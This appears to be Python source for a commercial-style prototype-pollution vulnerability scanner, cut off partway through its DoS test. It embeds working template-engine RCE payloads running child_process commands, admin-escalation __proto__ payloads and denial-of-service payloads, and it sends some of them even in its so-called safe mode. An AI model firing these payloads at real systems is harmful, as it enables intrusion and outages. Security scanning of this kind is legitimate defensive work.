"""
Prototype Pollution Scanner - ENTERPRISE EDITION v2.0

Enterprise-grade JavaScript prototype pollution vulnerability scanner with
comprehensive coverage for server-side and client-side attack vectors.

SAFETY MODES:
- passive/safe/cautious: READ-ONLY mode - Detection via error messages only
- standard: Safe payloads that don't cause permanent changes
- aggressive: Full testing including state-changing payloads

Features:
- Server-side prototype pollution (Node.js/Express)
- Client-side DOM-based pollution detection
- Framework-specific RCE gadgets (EJS, Pug, Handlebars, etc.)
- JSON merge vulnerability testing
- Query parameter pollution (nested object syntax)
- Gadget chain detection for RCE
- Library vulnerability fingerprinting (CVE matching)
- Recursive pollution testing
- Denial of Service payloads
- AST injection attacks

RCE Gadget Chains:
- EJS (outputFunctionName)
- Pug (compileDebug, self)
- Handlebars (helpers/blockHelpers)
- Nunjucks (env exploitation)
- Express.js (view options)
- child_process bypass techniques

CWE Coverage:
- CWE-1321: Improperly Controlled Modification of Object Prototype Attributes
- CWE-400: Uncontrolled Resource Consumption (DoS via pollution)
- CWE-94: Improper Control of Generation of Code (RCE via gadgets)

Author: PetNTester AI Enterprise
Version: 2.0.0-enterprise
"""

from __future__ import annotations

import asyncio
import json
import os
import re
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import TYPE_CHECKING, Any, Optional
from urllib.parse import urljoin, urlparse

import httpx

from scanning.findings import Finding, Severity, VulnType
from scanning.vuln_scanner import ScanModule
from utils.logger import get_logger
from utils.scan_client import get_scan_client


# Safe mode environment variable - set by full_scanner.py
SAFE_MODE = os.environ.get("PHANTOM_SAFE_MODE", "safe").lower()
ALLOW_WRITES = SAFE_MODE in ("standard", "aggressive")
from utils.rate_limiter import RateLimiter
from scanning.scan_context import ScanContext

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)


# ============================================================================
# ENTERPRISE DATA STRUCTURES
# ============================================================================

class PPVulnType(Enum):
    """Types of prototype pollution vulnerabilities."""
    SERVER_SIDE = auto()          # Node.js server-side pollution
    CLIENT_SIDE = auto()          # DOM-based pollution
    RCE_GADGET = auto()           # Pollution leading to RCE
    PRIVILEGE_ESCALATION = auto() # Auth bypass via pollution
    DOS = auto()                  # Denial of service
    LIBRARY_VULN = auto()         # Known library vulnerability
    QUERY_PARAM = auto()          # URL query parameter pollution
    JSON_MERGE = auto()           # JSON merge operation pollution


class GadgetType(Enum):
    """Types of RCE gadgets."""
    EJS_OUTPUT_FUNCTION = auto()
    PUG_COMPILE_DEBUG = auto()
    HANDLEBARS_HELPERS = auto()
    NUNJUCKS_ENV = auto()
    EXPRESS_VIEW_OPTIONS = auto()
    LODASH_TEMPLATE = auto()
    JQUERY_EXTEND = auto()


@dataclass
class PPTestResult:
    """Result of a prototype pollution test."""
    vulnerable: bool
    vuln_type: Optional[PPVulnType] = None
    gadget: Optional[GadgetType] = None
    confidence: float = 0.0
    payload: str = ""
    evidence: list[str] = field(default_factory=list)
    rce_possible: bool = False


@dataclass
class LibraryVuln:
    """Known library vulnerability."""
    library: str
    cve: str
    min_version: str
    max_version: str
    description: str
    payload: dict


# ============================================================================
# ENTERPRISE PAYLOADS - Comprehensive PP Coverage
# ============================================================================

# Basic prototype pollution payloads
PP_PAYLOADS_BASIC = [
    # __proto__ pollution
    {"__proto__": {"polluted": "true"}},
    {"__proto__": {"isAdmin": True}},
    {"__proto__": {"admin": "1"}},
    {"__proto__": {"role": "admin"}},
    {"__proto__": {"authenticated": True}},
    {"__proto__": {"authorized": True}},
    {"__proto__": {"bypass": True}},
    
    # constructor.prototype pollution
    {"constructor": {"prototype": {"polluted": "true"}}},
    {"constructor": {"prototype": {"isAdmin": True}}},
    {"constructor": {"prototype": {"admin": True}}},
    
    # Nested __proto__
    {"a": {"__proto__": {"polluted": "true"}}},
    {"a": {"b": {"__proto__": {"polluted": "true"}}}},
    {"x": {"y": {"z": {"__proto__": {"polluted": "true"}}}}},
    
    # Array pollution
    {"__proto__": {"length": 100}},
    {"__proto__": {"0": "polluted"}},
    
    # Object method pollution
    {"__proto__": {"toString": "polluted"}},
    {"__proto__": {"valueOf": "polluted"}},
    {"__proto__": {"hasOwnProperty": "polluted"}},
]

# RCE gadget payloads - framework specific
PP_RCE_GADGETS = {
    GadgetType.EJS_OUTPUT_FUNCTION: [
        # EJS outputFunctionName RCE
        {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').exec('id');x"}},
        {"__proto__": {"outputFunctionName": "x;global.process.mainModule.require('child_process').execSync('id');x"}},
        {"__proto__": {"outputFunctionName": "_tmp1;global.process.mainModule.constructor._load('child_process').execSync('id');var __tmp2"}},
        # Alternative syntax
        {"constructor": {"prototype": {"outputFunctionName": "x;require('child_process').execSync('id');x"}}},
    ],
    GadgetType.PUG_COMPILE_DEBUG: [
        # Pug/Jade compileDebug
        {"__proto__": {"block": {"type": "Text", "val": "x;process.mainModule.require('child_process').exec('id');x"}}},
        {"__proto__": {"compileDebug": True}},
        {"__proto__": {"self": True}},
        {"__proto__": {"debug": True}},
        {"__proto__": {"pretty": "x;require('child_process').execSync('id');x"}},
    ],
    GadgetType.HANDLEBARS_HELPERS: [
        # Handlebars helpers exploitation
        {"__proto__": {"helpers": {"constructor": "function(){return process.mainModule.require('child_process').execSync('id');}"}}},
        {"__proto__": {"blockHelpers": {"constructor": "()=>require('child_process').execSync('id')"}}},
        {"__proto__": {"allowedProtoProperties": {"constructor": True}}},
        {"__proto__": {"allowProtoPropertiesByDefault": True}},
    ],
    GadgetType.NUNJUCKS_ENV: [
        # Nunjucks env exploitation
        {"__proto__": {"env": {"autoescape": False}}},
        {"__proto__": {"env": {"extensions": {"constructor": "require('child_process').execSync('id')"}}}},
    ],
    GadgetType.EXPRESS_VIEW_OPTIONS: [
        # Express view options
        {"__proto__": {"view options": {"outputFunctionName": "x;require('child_process').execSync('id');x"}}},
        {"__proto__": {"view options": {"client": True, "compileDebug": True}}},
        {"__proto__": {"settings": {"view options": {"outputFunctionName": "x;require('child_process').execSync('id');x"}}}},
    ],
    GadgetType.LODASH_TEMPLATE: [
        # Lodash template injection
        {"__proto__": {"sourceURL": "x"}},
        {"constructor": {"prototype": {"sourceURL": "\u000areturn process.mainModule.require('child_process').execSync('id')//"}}},
    ],
}

# URL parameter pollution payloads
URL_PP_PAYLOADS = [
    # Standard __proto__ syntax
    "__proto__[polluted]=true",
    "__proto__.polluted=true",
    "__proto__[isAdmin]=true",
    "__proto__[role]=admin",
    "__proto__[admin]=1",
    "__proto__[authenticated]=true",
    
    # constructor.prototype syntax
    "constructor[prototype][polluted]=true",
    "constructor.prototype.polluted=true",
    "constructor[prototype][isAdmin]=true",
    
    # Nested object syntax
    "a[__proto__][polluted]=true",
    "a.b[__proto__][polluted]=true",
    "x[__proto__][y]=z",
    
    # Array index pollution
    "__proto__[0]=polluted",
    "arr[__proto__][push]=polluted",
    
    # Double encoding
    "__proto__%5Bpolluted%5D=true",
    "%5F%5Fproto%5F%5F%5Bpolluted%5D=true",
    
    # JSON in URL
    "data={\"__proto__\":{\"polluted\":true}}",
    "__proto__={\"isAdmin\":true}",
    
    # Bracket notation variations
    "obj[__proto__][role]=admin",
    "user[constructor][prototype][admin]=true",
]

# DoS payloads
PP_DOS_PAYLOADS = [
    # Infinite recursion
    {"__proto__": {"constructor": {"prototype": {"__proto__": "circular"}}}},
    
    # Memory exhaustion
    {"__proto__": {"length": 999999999}},
    {"__proto__": {"toString": {"length": 999999999}}},
    
    # CPU exhaustion
    {"__proto__": {"hasOwnProperty": "function(){while(true){}}"}},
    
    # Type confusion
    {"__proto__": {"then": "function(){}"}},  # Promise-like
    {"__proto__": {"toJSON": "function(){while(true){}}"}},
]

# Known vulnerable libraries
VULNERABLE_LIBRARIES = [
    LibraryVuln("lodash", "CVE-2019-10744", "0.0.0", "4.17.11", 
                "defaultsDeep prototype pollution", {"__proto__": {"polluted": True}}),
    LibraryVuln("lodash", "CVE-2020-8203", "0.0.0", "4.17.18",
                "zipObjectDeep prototype pollution", {"constructor": {"prototype": {"polluted": True}}}),
    LibraryVuln("jquery", "CVE-2019-11358", "0.0.0", "3.4.0",
                "jQuery.extend deep pollution", {"__proto__": {"polluted": True}}),
    LibraryVuln("minimist", "CVE-2020-7598", "0.0.0", "1.2.2",
                "Constructor pollution", {"constructor": {"prototype": {"polluted": True}}}),
    LibraryVuln("hoek", "CVE-2018-3728", "0.0.0", "4.2.1",
                "merge() pollution", {"__proto__": {"polluted": True}}),
    LibraryVuln("merge", "CVE-2020-28499", "0.0.0", "2.1.0",
                "Recursive merge pollution", {"__proto__": {"polluted": True}}),
    LibraryVuln("mixin-deep", "CVE-2019-10746", "0.0.0", "1.3.2",
                "Deep mixin pollution", {"constructor": {"prototype": {"polluted": True}}}),
    LibraryVuln("set-value", "CVE-2019-10747", "0.0.0", "2.0.1",
                "Set value pollution", {"__proto__": {"polluted": True}}),
    LibraryVuln("dot-prop", "CVE-2020-8116", "0.0.0", "5.1.1",
                "Property path pollution", {"__proto__": {"polluted": True}}),
    LibraryVuln("object-path", "CVE-2020-15256", "0.0.0", "0.11.4",
                "Path set pollution", {"__proto__": {"polluted": True}}),
]

# DOM sinks for client-side pollution
DOM_POLLUTION_SINKS = [
    # Merge functions
    "Object.assign",
    "$.extend",
    "_.merge",
    "_.mergeWith",
    "_.defaultsDeep",
    "_.set",
    "_.setWith",
    "jQuery.extend",
    "angular.merge",
    "angular.extend",
    "deepmerge",
    "merge-deep",
    "lodash.merge",
    "lodash.defaultsDeep",
    "hoek.merge",
    "hoek.applyToDefaults",
    "xtend",
    "just-extend",
    
    # Object manipulation
    "Object.defineProperty",
    "Reflect.set",
    "Reflect.defineProperty",
    
    # Template engines client-side
    "Handlebars.compile",
    "Mustache.render",
    "_.template",
    "ejs.render",
]

# Response indicators for successful pollution
POLLUTION_INDICATORS = [
    "polluted",
    "isAdmin",
    "isadmin",
    "admin\":true",
    "admin\": true",
    "role\":\"admin",
    "authenticated\":true",
    "authorized\":true",
    "bypass\":true",
    "__proto__",  # Reflected but processed
]


class PrototypePollutionScanner(ScanModule):
    """
    Prototype Pollution Scanner - ENTERPRISE EDITION v2.0
    
    Comprehensive prototype pollution testing including:
    - Server-side Node.js pollution
    - Client-side DOM pollution detection
    - Framework-specific RCE gadget chains
    - Library vulnerability fingerprinting
    - Query parameter pollution
    - Recursive and nested pollution
    - DoS payload testing
    - AST injection attacks
    
    CWE Coverage: CWE-1321, CWE-400, CWE-94
    """
    
    name = "prototype_pollution_scanner"
    version = "2.0-enterprise"
    
    # Backward compatibility
    PP_PAYLOADS = PP_PAYLOADS_BASIC
    URL_PP_PAYLOADS = URL_PP_PAYLOADS
    DOM_SINKS = DOM_POLLUTION_SINKS
    
    def __init__(
        self,
        settings: Settings,
        *,
        findings_store: Any = None,
        rate_limiter: Any = None,
    ) -> None:
        super().__init__(settings, findings_store=findings_store, rate_limiter=rate_limiter)
        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
    
    # Server-side prototype pollution only applies to JavaScript backends.
    # These tech fingerprints indicate a JS backend is present.
    _JS_BACKEND_INDICATORS = frozenset({
        "node.js", "nodejs", "express", "express.js", "next.js", "nextjs",
        "nuxt", "nuxt.js", "koa", "fastify", "hapi", "nest.js", "nestjs",
        "deno", "bun", "meteor", "sails", "sails.js", "adonis", "adonisjs",
        "remix", "gatsby", "svelte", "sveltekit",
    })

    def _has_js_backend(self, asset_data: dict[str, Any]) -> bool:
        """Check if the target's tech stack includes a JavaScript backend."""
        if isinstance(asset_data, dict):
            techs = asset_data.get("technologies", [])
        if not techs:
            return False
        for t in techs:
            name = (t.get("name", "") if isinstance(t, dict) else str(t)).lower()
            if any(js in name for js in self._JS_BACKEND_INDICATORS):
                return True
        return False

    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> dict[str, Any]:
        """
        Enterprise: Comprehensive prototype pollution scan.

        Server-side tests (JSON body, URL params, RCE gadgets, DoS, API merge)
        are SKIPPED when no JavaScript backend is detected — __proto__ is
        meaningless on Java, Python, Ruby, Go, PHP, etc.

        Client-side tests (DOM sinks, library fingerprinting) always run because
        they check front-end JavaScript regardless of backend.
        """

        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
        self._ctx = ScanContext(asset_data)
        self._auth_headers = self._ctx.auth_headers

        findings: list[dict[str, Any]] = []

        base_url = f"https://{host}" if not host.startswith("http") else host
        if isinstance(asset_data, dict):
            endpoints = asset_data.get("endpoints", [])

        js_backend = self._has_js_backend(asset_data)
        if not js_backend:
            logger.info(
                "[PrototypePollution] No JS backend detected — "
                "skipping server-side tests (JSON, URL, RCE, DoS, API). "
                "Running client-side checks only (DOM sinks, library fingerprinting)."
            )

        # FIX: Pass auth headers for authenticated endpoint testing
        async with get_scan_client(
            verify_ssl=False,
            timeout=self.timeout,
            custom_headers=self._auth_headers,
        ) as client:
            # === Server-side tests — only when JS backend detected ===
            if js_backend:
                # Phase 1: Test JSON body prototype pollution
                json_findings = await self._test_json_pollution_enterprise(
                    client, base_url, endpoints, rate_limiter
                )
                findings.extend(json_findings)

                # Phase 2: Test URL parameter pollution
                url_findings = await self._test_url_pollution_enterprise(
                    client, base_url, endpoints, rate_limiter
                )
                findings.extend(url_findings)

                # Phase 3: Test RCE gadget chains
                rce_findings = await self._test_rce_gadgets(
                    client, base_url, endpoints, rate_limiter
                )
                findings.extend(rce_findings)

                # Phase 6: DoS testing
                dos_findings = await self._test_dos_pollution(
                    client, base_url, rate_limiter
                )
                findings.extend(dos_findings)

                # Phase 7: API endpoint testing
                api_findings = await self._test_api_endpoints_enterprise(
                    client, base_url, rate_limiter
                )
                findings.extend(api_findings)

            # === Client-side tests — always run ===
            # Phase 4: Check for DOM-based pollution (client-side JS)
            dom_findings = await self._test_dom_pollution_enterprise(
                client, base_url, rate_limiter
            )
            findings.extend(dom_findings)

            # Phase 5: Library vulnerability fingerprinting (client-side JS)
            lib_findings = await self._test_library_vulns(
                client, base_url, rate_limiter
            )
            findings.extend(lib_findings)

        return {"findings": findings}
    
    async def _test_json_pollution_enterprise(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test JSON body for prototype pollution.
        """
        findings = []
        
        # Combine discovered and common endpoints
        common_endpoints = [
            "/api/user", "/api/users", "/api/profile", "/api/settings",
            "/api/update", "/api/merge", "/api/config", "/api/data",
            "/api/v1/user", "/api/v1/profile", "/api/v1/settings",
            "/settings", "/profile", "/update", "/user", "/account",
            "/api/account", "/api/preferences", "/preferences",
        ]
        
        all_endpoints = list(set(endpoints[:10] + common_endpoints))
        
        for endpoint in all_endpoints:
            url = endpoint if endpoint.startswith("http") else urljoin(base_url, endpoint)
            
            # Check if endpoint exists and accepts JSON
            await rate_limiter.acquire()
            try:
                check = await client.options(url)
                # Also try GET to see if endpoint exists
                get_check = await client.get(url)
                if get_check.status_code == 404 and check.status_code == 404:
                    continue
            except Exception:
                continue
            
            # Test with basic payloads
            for payload in PP_PAYLOADS_BASIC[:15]:
                await rate_limiter.acquire()
                
                try:
                    # Test POST
                    response = await client.post(
                        url,
                        json=payload,
                        headers={"Content-Type": "application/json"}
                    )
                    
                    result = self._analyze_pollution_response(
                        response, payload, "POST"
                    )
                    
                    if result.vulnerable:
                        findings.append(Finding(
                            vuln_type=VulnType.PROTOTYPE_POLLUTION,
                            name="Server-Side Prototype Pollution",
                            severity=Severity.CRITICAL if result.rce_possible else "HIGH",
                            description=f"Prototype pollution via {result.vuln_type.name if result.vuln_type else 'JSON body'}. "
                                       f"Object prototype can be modified through user input.",
                            host=urlparse(url).netloc,
                            endpoint=url,
                            evidence=[
                                f"Method: POST",
                                f"Payload: {json.dumps(payload)[:200]}",
                                f"Confidence: {result.confidence:.0%}",
                                *result.evidence,
                            ],
                            cvss_score=9.0,
                            cwe_id="CWE-1321",
                            confidence_score=result.confidence * 100,
                            remediation="Use Object.create(null) for objects without prototype. "
                                       "Sanitize __proto__, constructor, and prototype keys from input. "
                                       "Use Map instead of plain objects for user data. "
                                       "Update vulnerable libraries.",
                        ).to_dict())
                        break
                    
                    # Test PUT/PATCH - ONLY in write-allowed modes
                    if not ALLOW_WRITES:
                        logger.debug(f"⚠️ SAFE MODE: Skipping PUT/PATCH prototype pollution tests")
                    else:
                        for method in ["PUT", "PATCH"]:
                            await rate_limiter.acquire()
                            
                            if method == "PUT":
                                resp = await client.put(url, json=payload)
                            else:
                                resp = await client.patch(url, json=payload)
                            
                            result = self._analyze_pollution_response(resp, payload, method)
                            
                            if result.vulnerable:
                                findings.append(Finding(
                                    vuln_type=VulnType.PROTOTYPE_POLLUTION,
                                    name=f"Prototype Pollution via {method}",
                                    severity=Severity.CRITICAL,
                                    description=f"Update endpoint vulnerable to prototype pollution",
                                    host=urlparse(url).netloc,
                                    endpoint=url,
                                    evidence=[
                                    f"Method: {method}",
                                    f"Payload: {json.dumps(payload)[:200]}",
                                ],
                                cvss_score=9.0,
                                cwe_id="CWE-1321",
                                confidence_score=result.confidence * 100,
                                remediation="Filter dangerous keys from update operations.",
                            ).to_dict())
                            break
                            
                except Exception as e:
                    logger.debug(f"JSON pollution test error: {e}")
        
        return findings
    
    def _analyze_pollution_response(
        self,
        response: httpx.Response,
        payload: dict,
        method: str,
    ) -> PPTestResult:
        """Analyze response for prototype pollution indicators."""
        result = PPTestResult(vulnerable=False)
        
        if response.status_code not in [200, 201, 204]:
            return result
        
        response_text = response.text.lower()
        
        # Check for pollution indicators
        for indicator in POLLUTION_INDICATORS:
            if indicator.lower() in response_text:
                result.vulnerable = True
                result.confidence = 0.8
                result.evidence.append(f"Indicator found: {indicator}")
        
        # Check for JSON response with pollution markers
        try:
            data = response.json()
            data_str = json.dumps(data).lower()
            
            if "polluted" in data_str:
                result.vulnerable = True
                result.confidence = 0.95
                result.evidence.append("Pollution marker in JSON response")
            
            if "isadmin" in data_str and "true" in data_str:
                result.vulnerable = True
                result.vuln_type = PPVulnType.PRIVILEGE_ESCALATION
                result.confidence = 0.9
                result.evidence.append("Admin privilege escalation detected")
                
        except json.JSONDecodeError:
            pass
        
        # Check for RCE gadget reflection
        payload_str = json.dumps(payload).lower()
        if "outputfunctionname" in payload_str and "outputfunctionname" in response_text:
            result.rce_possible = True
            result.evidence.append("EJS RCE gadget reflected")
        
        return result
    
    async def _test_url_pollution_enterprise(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test URL parameters for prototype pollution.
        """
        findings = []
        
        test_paths = ["/", "/api", "/search", "/filter", "/query", "/data"]
        
        # Add endpoint paths
        for ep in endpoints[:5]:
            parsed = urlparse(ep)
            if parsed.path and parsed.path not in test_paths:
                test_paths.append(parsed.path)
        
        # Fetch baseline responses (without payload) to compare.
        # If the indicator already exists in the baseline, it's not our payload.
        baseline_cache: dict[str, str] = {}
        for path in test_paths[:10]:
            try:
                await rate_limiter.acquire()
                burl = urljoin(base_url, path)
                bresp = await client.get(burl)
                baseline_cache[path] = bresp.text.lower()
            except Exception:
                baseline_cache[path] = ""

        for path in test_paths[:10]:
            baseline_lower = baseline_cache.get(path, "")
            for payload in URL_PP_PAYLOADS[:15]:
                await rate_limiter.acquire()

                try:
                    url = urljoin(base_url, f"{path}?{payload}")
                    response = await client.get(url)

                    response_lower = response.text.lower()

                    vulnerable = False
                    evidence = []

                    for indicator in POLLUTION_INDICATORS:
                        ind_lower = indicator.lower()
                        if ind_lower in response_lower:
                            # Skip if indicator was already in the baseline
                            # (e.g., "__proto__" reflected from URL in HTML,
                            #  or login page that always contains "authenticated")
                            if ind_lower in baseline_lower:
                                continue
                            # Skip if it's just a JSON-quoted string reflection
                            if f'"{indicator}"' in response_lower:
                                continue
                            vulnerable = True
                            evidence.append(f"Indicator: {indicator}")

                    if vulnerable:
                        findings.append(Finding(
                            vuln_type=VulnType.PROTOTYPE_POLLUTION,
                            name="URL Parameter Prototype Pollution",
                            severity=Severity.HIGH,
                            description="Prototype pollution via URL query parameters. "
                                       "Nested object syntax is being parsed and processed.",
                            host=urlparse(base_url).netloc,
                            endpoint=url,
                            evidence=[
                                f"Payload: {payload}",
                                *evidence,
                            ],
                            cvss_score=7.5,
                            cwe_id="CWE-1321",
                            confidence_score=90,
                            remediation="Use strict query parameter parsing. "
                                       "Reject nested object syntax in query strings. "
                                       "Use a query string parser that doesn't support bracket notation.",
                        ).to_dict())
                        break

                except Exception as e:
                    logger.debug(f"URL pollution test error: {e}")
        
        return findings
    
    async def _test_rce_gadgets(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test framework-specific RCE gadget chains.
        """
        findings = []
        
        # Target endpoints that might render templates
        render_endpoints = [
            "/api/render", "/api/template", "/api/view",
            "/render", "/template", "/preview",
            "/api/email/preview", "/email/template",
            "/api/report", "/report/generate",
        ]
        
        all_endpoints = list(set(endpoints[:5] + render_endpoints))
        
        for endpoint in all_endpoints:
            url = endpoint if endpoint.startswith("http") else urljoin(base_url, endpoint)
            
            for gadget_type, payloads in PP_RCE_GADGETS.items():
                for payload in payloads[:2]:  # Limit payloads per gadget
                    await rate_limiter.acquire()
                    
                    try:
                        response = await client.post(
                            url,
                            json=payload,
                            headers={"Content-Type": "application/json"}
                        )

                        # FIX 2026-02-18: Skip error responses - they contain false positive patterns
                        # Rails/Node.js 500 error pages include "spawn", "child_process", "ENOENT", etc.
                        if response.status_code >= 400:
                            # Error responses are NOT evidence of successful exploitation
                            logger.debug(f"Skipping RCE check for {url}: status {response.status_code}")
                            continue

                        # FIX: Detect error pages even with 200 status (some frameworks do this)
                        response_lower = response.text.lower()
                        error_page_indicators = [
                            "exception", "error occurred", "stack trace", "traceback",
                            "internal server error", "application error", "debug mode",
                            "rails error", "actioncontroller::routingerror",
                            "express error", "syntaxerror", "typeerror", "referenceerror",
                        ]
                        is_error_page = any(ind in response_lower for ind in error_page_indicators)
                        if is_error_page:
                            logger.debug(f"Skipping RCE check for {url}: error page detected")
                            continue

                        # Check for RCE indicators (only for successful responses)
                        rce_indicators = [
                            "uid=", "gid=", "groups=",  # id command output
                            "root:", "www-data:",       # passwd content
                        ]

                        # FIX: "ENOENT", "spawn", "child_process" removed - too common in error pages

                        for indicator in rce_indicators:
                            if indicator in response.text:
                                findings.append(Finding(
                                    vuln_type=VulnType.PROTOTYPE_POLLUTION,
                                    name=f"Prototype Pollution RCE ({gadget_type.name})",
                                    severity=Severity.CRITICAL,
                                    description=f"Remote code execution via prototype pollution. "
                                               f"Gadget chain: {gadget_type.name}. "
                                               f"Command execution confirmed.",
                                    host=urlparse(url).netloc,
                                    endpoint=url,
                                    evidence=[
                                        f"Gadget: {gadget_type.name}",
                                        f"Payload: {json.dumps(payload)[:150]}...",
                                        f"RCE indicator: {indicator}",
                                    ],
                                    cvss_score=10.0,
                                    cwe_id="CWE-94",
                                    confidence_score=95,
                                    remediation="CRITICAL: Immediate action required. "
                                               "This is a remote code execution vulnerability. "
                                               "Update template engines. Sanitize all input.",
                                ).to_dict())
                                return findings  # One RCE is enough
                        
                        # Check for gadget reflection (potential RCE)
                        gadget_keys = ["outputFunctionName", "compileDebug", "helpers", "env"]
                        for key in gadget_keys:
                            if key in response.text:
                                findings.append(Finding(
                                    vuln_type=VulnType.PROTOTYPE_POLLUTION,
                                    name=f"Potential RCE Gadget Reflected ({gadget_type.name})",
                                    severity=Severity.HIGH,
                                    description=f"RCE gadget key '{key}' reflected in response. "
                                               f"Prototype pollution enables template engine exploitation.",
                                    host=urlparse(url).netloc,
                                    endpoint=url,
                                    evidence=[
                                        f"Gadget type: {gadget_type.name}",
                                        f"Reflected key: {key}",
                                    ],
                                    cvss_score=8.5,
                                    cwe_id="CWE-1321",
                                    confidence_score=90,
                                    remediation="Filter prototype pollution keys. Update template engines.",
                                ).to_dict())
                                break
                                
                    except Exception as e:
                        logger.debug(f"RCE gadget test error: {e}")
        
        return findings
    
    async def _test_dom_pollution_enterprise(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Check for potential DOM-based prototype pollution.
        """
        findings = []
        
        await rate_limiter.acquire()
        
        try:
            response = await client.get(base_url)
            html = response.text
            html_lower = html.lower()
            
            # Check for vulnerable merge patterns
            found_sinks = []
            for sink in DOM_POLLUTION_SINKS:
                if sink.lower() in html_lower:
                    found_sinks.append(sink)
            
            if found_sinks:
                # Determine severity based on sink type
                high_risk_sinks = ["$.extend", "_.merge", "_.defaultsDeep", "deepmerge"]
                severity = "HIGH" if any(s in found_sinks for s in high_risk_sinks) else "MEDIUM"
                
                findings.append(Finding(
                    vuln_type=VulnType.PROTOTYPE_POLLUTION,
                    name="Potential DOM Prototype Pollution",
                    severity=severity,
                    description=f"Vulnerable merge functions detected in client-side code. "
                               f"DOM-based prototype pollution may be possible.",
                    host=urlparse(base_url).netloc,
                    endpoint=base_url,
                    evidence=[
                        f"Vulnerable sinks found: {', '.join(found_sinks[:5])}",
                        "Manual testing required for exploitation",
                    ],
                    cvss_score=6.1 if severity == "MEDIUM" else 7.5,
                    cwe_id="CWE-1321",
                    confidence_score=85,
                    remediation="Update libraries to patched versions. "
                               "Use Object.freeze on Object.prototype. "
                               "Implement Object.create(null) for safe objects.",
                ).to_dict())
            
            # Check for specific library patterns
            lib_patterns = [
                (r'lodash[@/](\d+\.\d+\.\d+)', "lodash"),
                (r'underscore[@/](\d+\.\d+\.\d+)', "underscore"),
                (r'jquery[@/](\d+\.\d+\.\d+)', "jquery"),
                (r'"version":\s*"(\d+\.\d+\.\d+)"', "unknown"),
            ]
            
            for pattern, lib in lib_patterns:
                match = re.search(pattern, html)
                if match:
                    version = match.group(1)
                    # FIX 2026-03-02: Cross-reference detected version against known CVEs
                    # instead of always reporting as generic "Library Version Detected".
                    matched_cves = []
                    for vuln in VULNERABLE_LIBRARIES:
                        if vuln.library == lib:
                            # Simple version comparison (works for semver)
                            try:
                                from packaging.version import Version
                                if Version(vuln.min_version) <= Version(version) < Version(vuln.max_version):
                                    matched_cves.append(vuln)
                            except Exception:
                                # Fallback: string comparison
                                if version < vuln.max_version:
                                    matched_cves.append(vuln)

                    if matched_cves:
                        cve_list = ", ".join(v.cve for v in matched_cves)
                        descs = "; ".join(f"{v.cve}: {v.description} (fixed in {v.max_version})" for v in matched_cves)
                        findings.append(Finding(
                            vuln_type=VulnType.PROTOTYPE_POLLUTION,
                            name=f"Vulnerable {lib} v{version} ({cve_list})",
                            severity=Severity.MEDIUM,
                            description=f"{lib} {version} is vulnerable to prototype pollution. {descs}",
                            host=urlparse(base_url).netloc,
                            endpoint=base_url,
                            evidence=[f"Library: {lib}", f"Version: {version}",
                                      *[f"{v.cve}: affects < {v.max_version}" for v in matched_cves]],
                            cvss_score=6.1,
                            cwe_id="CWE-1321",
                            confidence_score=95,
                            remediation=f"Upgrade {lib} to version {matched_cves[-1].max_version} or later.",
                        ).to_dict())
                    else:
                        # No known CVE — report as INFO with correct type
                        findings.append(Finding(
                            vuln_type=VulnType.INFO_DISCLOSURE,
                            name=f"Library Detected: {lib} v{version}",
                            severity=Severity.INFO,
                            description=f"{lib} version {version} detected. No known prototype pollution CVEs for this version.",
                            host=urlparse(base_url).netloc,
                            endpoint=base_url,
                            evidence=[f"Library: {lib}", f"Version: {version}"],
                            cvss_score=0.0,
                            cwe_id="CWE-200",
                            confidence_score=80,
                            remediation=f"Keep {lib} updated to the latest version.",
                        ).to_dict())
                    
        except Exception as e:
            logger.debug(f"DOM pollution check error: {e}")
        
        return findings
    
    async def _test_library_vulns(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test for known library vulnerabilities.
        """
        findings = []
        
        await rate_limiter.acquire()
        
        try:
            response = await client.get(base_url)
            html = response.text.lower()
            
            for vuln in VULNERABLE_LIBRARIES:
                if vuln.library.lower() in html:
                    findings.append(Finding(
                        vuln_type=VulnType.PROTOTYPE_POLLUTION,
                        name=f"Potentially Vulnerable Library: {vuln.library} ({vuln.cve})",
                        severity=Severity.MEDIUM,
                        description=f"{vuln.library} detected. Vulnerable versions: {vuln.min_version} - {vuln.max_version}. "
                                   f"{vuln.description}",
                        host=urlparse(base_url).netloc,
                        endpoint=base_url,
                        evidence=[
                            f"Library: {vuln.library}",
                            f"CVE: {vuln.cve}",
                            f"Description: {vuln.description}",
                        ],
                        cvss_score=6.5,
                        cwe_id="CWE-1321",
                        confidence_score=85,
                        remediation=f"Update {vuln.library} to version > {vuln.max_version}.",
                    ).to_dict())
                    
        except Exception as e:
            logger.debug(f"Library vuln check error: {e}")
        
        return findings
    
    async def _test_dos_pollution(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test for DoS via prototype pollution.
        """
        findings = []
        
        dos_endpoints = ["/api/data", "/api/process", "/api/parse", "/data"]
        
        for endpoint in dos_endpoints:
            url = urljoin(base_url, endpoint)
            
            for payload in PP_DOS_PAYLOADS[:3]:
                await rate_limiter.acquire()
                
                try:
                    # Use short timeout to detect DoS
                    start_time = asyncio.get_event_loop().time()
                    
                    response = await client.post(
                        url,
                        json=payload,
                        headers={"Content-Type": "application/json"},
                        timeout=5.0
                    )
                    
                    elapsed = asyncio.get_event_loop().time() - start_time
                    
                    # Check for significant delay
                    if elapsed > 3.0:
                        findings.append(Finding(
